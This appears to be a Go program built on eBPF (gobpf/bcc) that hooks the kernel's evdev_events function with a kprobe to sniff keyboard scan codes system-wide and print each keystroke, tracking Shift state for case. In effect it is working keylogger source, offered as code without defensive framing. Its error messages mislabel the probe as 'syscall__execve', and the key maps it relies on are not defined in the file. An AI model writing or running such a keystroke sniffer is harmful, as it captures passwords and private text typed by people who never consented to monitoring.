// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
// http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package main

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"log"
	"os"
	"os/signal"

	bpf "github.com/iovisor/gobpf/bcc"
	"github.com/sirupsen/logrus"
)

import "C"

const source string = `
#include <uapi/linux/ptrace.h>
#include <linux/sched.h>
#include <linux/fs.h>
#include <linux/input.h>
#include <uapi/linux/input-event-codes.h>

struct keyEvent {
	__s32 value1;
	__s32 value2;
	__s32 value3;
};

BPF_PERF_OUTPUT(events);

int evdev_events_sniff(struct pt_regs *ctx)
{
	struct input_value *in = (struct input_value*)PT_REGS_PARM2(ctx);
	unsigned int count = (unsigned int) PT_REGS_PARM3(ctx);
	if (in->type != EV_MSC) {
		return 0;
	}
	if (in->code != MSC_SCAN) {
	 	return 0;
	}
	struct keyEvent sniffed = {};
	sniffed.value1 = in->value;
	in++;
	sniffed.value2 = in->value;
	in++;
	sniffed.value3 = in->value;
	events.perf_submit(ctx, &sniffed, sizeof(sniffed));

    return 0;
}
`

const (
	LEFTSHIFT  = 42
	RIGHTSHIFT = 54
)

type keyEvent struct {
	Value1 int32
	Value2 int32
	Value3 int32
}

func main() {
	m := bpf.NewModule(source, []string{})
	defer m.Close()
	kprobe, err := m.LoadKprobe("evdev_events_sniff")
	if err != nil {
		log.Fatalf("Failed to load syscall__execve: %s\n", err)
	}
	if err := m.AttachKprobe("evdev_events", kprobe, -1); err != nil {
		log.Fatalf("Failed to attach syscall__execve: %s\n", err)
	}
	table := bpf.NewTable(m.TableId("events"), m)
	channel := make(chan []byte, 1000)
	perfMap, err := bpf.InitPerfMap(table, channel)
	if err != nil {
		log.Fatalf("Failed to init perf map: %s\n", err)
	}
	sig := make(chan os.Signal, 1)
	signal.Notify(sig, os.Interrupt)
	go func() {
		logrus.Infoln("Starting")
		// upperCase := false
		leftShiftPressed := false
		rightShiftPressed := false
		for {
			b := <-channel
			ke := KeyEvent(b)
			switch {
			case (ke.Value1 == LEFTSHIFT) && (ke.Value2 == 1):
				leftShiftPressed = true
			case (ke.Value1 == RIGHTSHIFT && (ke.Value2 == 1)):
				rightShiftPressed = true
			case (ke.Value1 == LEFTSHIFT) && (ke.Value2 == 0):
				leftShiftPressed = false
			case (ke.Value1 == RIGHTSHIFT) && (ke.Value2 == 0):
				rightShiftPressed = false
			}
			// if (ke.Value1 == LEFTSHIFT) && (ke.Value2 == 1) {
			// 	leftShiftPressed = true
			// }
			// if (ke.Value1 == RIGHTSHIFT) && (ke.Value2 == 1) {
			// 	rightShiftPressed = true
			// }
			// if (ke.Value1 == LEFTSHIFT) && (ke.Value2 == 0) {
			// 	leftShiftPressed = false
			// }
			// if (ke.Value1 == RIGHTSHIFT) && (ke.Value2 == 0) {
			// 	rightShiftPressed = false
			// }
			for i := 0; i < int(ke.Value2); i++ {
				if leftShiftPressed || rightShiftPressed {
					fmt.Print(upperCaseKeyMap[ke.Value1])
					continue
				}
				// switch leftShiftPressed || rightShiftPressed {
				// case true:
				// 	s = upperCaseKeyMap[ke.Value1]
				// default:
				// 	s = lowerCaseKeymap[ke.Value1]
				// }
				fmt.Print(lowerCaseKeymap[ke.Value1])
			}

		}
	}()
	perfMap.Start()
	<-sig
	perfMap.Stop()
}

func KeyEvent(b []byte) keyEvent {
	var ke keyEvent
	buf := bytes.NewBuffer(b[:4])
	binary.Read(buf, binary.LittleEndian, &ke.Value1)
	buf = bytes.NewBuffer(b[4:8])
	binary.Read(buf, binary.LittleEndian, &ke.Value2)
	buf = bytes.NewBuffer(b[8:])
	binary.Read(buf, binary.LittleEndian, &ke.Value3)
	return ke
}
